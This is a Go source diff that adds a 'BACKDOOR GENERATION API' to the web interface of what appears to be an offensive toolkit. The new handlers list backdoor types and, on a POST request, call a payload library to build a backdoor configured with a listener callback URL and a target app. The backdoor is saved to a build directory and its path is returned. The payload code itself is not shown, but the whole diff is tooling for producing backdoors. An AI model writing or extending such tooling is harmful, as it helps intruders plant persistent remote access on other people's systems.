@@ -343,3 +343,54 @@ func findRoot() string {
 	}
 	return "."
 }
+
+// ══════════════════════════════════════════
+//  BACKDOOR GENERATION API
+// ══════════════════════════════════════════
+
+func (w *WebUI) handleBackdoorTypes(rw http.ResponseWriter, r *http.Request) {
+	types := payloads.ListBackdoorTypes()
+	writeJSON(rw, types)
+}
+
+func (w *WebUI) handleBackdoorGenerate(rw http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(rw, "POST required", 405)
+		return
+	}
+
+	var req struct {
+		Type        string `json:"type"`
+		ListenerURL string `json:"listener_url"`
+		TargetApp   string `json:"target_app"`
+	}
+	json.NewDecoder(r.Body).Decode(&req)
+
+	if req.Type == "" || req.ListenerURL == "" {
+		writeJSON(rw, map[string]string{"error": "type and listener_url required"})
+		return
+	}
+
+	root := findRoot()
+	outputDir := filepath.Join(root, "build", "payloads", "backdoors", req.Type)
+
+	cfg := payloads.BackdoorConfig{
+		Type:        payloads.BackdoorType(req.Type),
+		ListenerURL: req.ListenerURL,
+		TargetApp:   req.TargetApp,
+		OutputDir:   outputDir,
+	}
+
+	outPath, err := payloads.GenerateBackdoor(cfg)
+	if err != nil {
+		writeJSON(rw, map[string]string{"error": err.Error()})
+		return
+	}
+
+	writeJSON(rw, map[string]interface{}{
+		"success":  true,
+		"message":  fmt.Sprintf("Backdoor generated: %s", outPath),
+		"filepath": outPath,
+		"type":     req.Type,
+	})
+}
